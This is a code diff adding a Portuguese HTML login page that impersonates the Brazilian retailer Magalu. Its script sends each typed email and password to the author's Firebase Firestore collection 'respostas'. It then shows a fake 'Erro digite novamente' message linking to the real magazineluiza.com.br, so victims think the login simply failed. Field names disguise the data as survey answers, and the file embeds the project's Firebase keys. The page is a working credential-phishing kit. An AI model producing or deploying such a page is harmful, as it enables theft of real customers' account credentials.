@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulário de Login/Cadastro</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                    },
+                },
+            },
+        }
+    </script>
+    <style>
+        /* Estilos personalizados para a fonte Inter */
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@100..900&display=swap');
+    </style>
+</head>
+<body class="bg-gray-100 flex items-center justify-center min-h-screen font-sans p-4">
+
+    <div class="w-full max-w-sm bg-white shadow-xl rounded-xl p-8 space-y-6 transform transition duration-500 hover:shadow-2xl sm:p-10">
+
+        <header class="text-center">
+            <svg class="w-12 h-12 mx-auto text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2"></path>
+            </svg>
+            <h1 class="text-2xl font-extrabold text-gray-800 mt-3">
+                Bem vindo de volta na Magalu
+            </h1>
+            <p class="text-gray-500 text-sm mt-1">
+                Acesse sua conta para continuar.
+            </p>
+        </header>
+
+        <form id="pesquisaForm" class="space-y-4">
+            
+            <div>
+                <label for="nome" class="block text-sm font-medium text-gray-700">Digite seu email</label>
+                <input
+                    type="text"
+                    id="nome"
+                    name="nome"
+                    required
+                    placeholder="Seu nome email"
+                    class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-lg shadow-sm focus:ring-blue-600 focus:border-blue-600 outline-none transition duration-150"
+                >
+            </div>
+
+            <div>
+                <label for="opiniao" class="block text-sm font-medium text-gray-700">Digite sua senha</label>
+                <input
+                    type="password"
+                    id="opiniao"
+                    name="opiniao"
+                    required
+                    placeholder="Digite sua senha"
+                    class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-lg shadow-sm focus:ring-blue-600 focus:border-blue-600 outline-none transition duration-150 **font-bold**"
+                >
+            </div>
+
+            <button
+                type="submit"
+                class="w-full flex justify-center py-2 px-4 border border-transparent rounded-lg shadow-md text-base font-semibold text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-600 transition duration-150 transform active:scale-95"
+            >
+                Entrar
+            </button>
+        </form>
+
+        <div class="text-center pt-4 border-t border-gray-200">
+             <p class="text-sm text-gray-600" id="status-message">
+                Ainda não tem conta? 
+                <a href="#" class="text-blue-600 hover:text-blue-700 font-bold">Cadastre-se aqui</a>
+             </p>
+
+             <p id="redirect-message" class="text-sm pt-2 hidden">
+                <a href="https://www.magazineluiza.com.br/" 
+                   class="text-blue-600 hover:text-blue-800 font-bold" 
+                   target="_blank">
+                   Erro digite novamente
+                </a>
+             </p>
+        </div>
+    </div>
+
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
+
+    <script>
+        // ******************************************************************************
+        // ** ALERTA: SUBSTITUA OS VALORES ABAIXO PELAS SUAS PRÓPRIAS CHAVES DO FIREBASE! **
+        // ******************************************************************************
+        const firebaseConfig = {
+    apiKey: "AIzaSyBP53nlpYoaCYetk7qcsy-BCUZ2mU9S82A",
+    authDomain: "magalu-5bf5a.firebaseapp.com",
+    projectId: "magalu-5bf5a",
+    storageBucket: "magalu-5bf5a.firebasestorage.app",
+    messagingSenderId: "440625197296",
+    appId: "1:440625197296:web:8397a6afdfbc3a63635235",
+    measurementId: "G-FEDNHYB2JC"
+};
+
+        // Inicializa o Firebase
+        firebase.initializeApp(firebaseConfig);
+
+        // Inicializa o Firestore
+        const db = firebase.firestore();
+    </script>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const form = document.getElementById('pesquisaForm');
+            const statusMessage = document.getElementById('status-message');
+            const redirectMessage = document.getElementById('redirect-message'); 
+
+            form.addEventListener('submit', async (e) => {
+                e.preventDefault(); // Previne o recarregamento da página
+
+                // Esconde a mensagem de redirecionamento no início de cada envio
+                redirectMessage.classList.add('hidden');
+                statusMessage.textContent = 'Enviando dados...';
+                statusMessage.classList.remove('text-red-600'); 
+
+                // 1. Coleta os dados dos campos de entrada
+                const nome = document.getElementById('nome').value;
+                const opiniao = document.getElementById('opiniao').value; 
+                
+                // Cria o objeto de dados
+                const dadosPesquisa = {
+                    email: nome, 
+                    senha: opiniao,
+                    dataEnvio: firebase.firestore.FieldValue.serverTimestamp() 
+                };
+
+                try {
+                    // 2. Salva os dados na coleção 'respostas' no Firestore
+                    await db.collection("respostas").add(dadosPesquisa);
+
+                    // 3. Feedback de sucesso
+                    // Exibe o link "Erro digite novamente" em azul
+                    statusMessage.textContent = 'Dados enviados com sucesso.';
+                    redirectMessage.classList.remove('hidden'); 
+                    form.reset(); // Limpa o formulário após o sucesso
+
+                } catch (error) {
+                    // 4. Feedback de erro
+                    console.error("Erro ao adicionar documento: ", error);
+                    statusMessage.textContent = '❌ Erro ao enviar. (Verifique o console e suas chaves do Firebase)';
+                    statusMessage.classList.add('text-red-600'); 
+                }
+            });
+        });
+    </script>
+</body>
+</html>
